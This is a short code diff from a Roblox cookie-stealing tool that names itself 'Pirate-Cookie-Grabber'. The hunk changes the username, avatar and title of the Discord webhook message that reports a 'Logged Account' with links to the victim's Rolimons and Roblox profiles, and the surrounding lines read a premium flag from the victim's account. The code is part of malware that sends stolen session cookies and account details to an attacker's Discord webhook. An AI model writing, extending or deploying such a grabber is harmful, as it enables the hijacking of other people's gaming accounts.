@@ -110,12 +110,12 @@ premium = info['IsPremium'];
 
 discord = Discord(url=webhookk)
 discord.post(
-    username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
+    username="🍪",
+    avatar_url="https://i.pinimg.com/736x/e4/f8/27/e4f827cb22a6d3f3519e033ceef75387.jpg",
     embeds=[
         {
-            "username": "BOT - Pirate 🍪",
-            "title": "💸 +1 Result Account 🕯️",
+            "username": "🍪",
+            "title": "Logged Account",
             "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 12452044,
             "fields": [
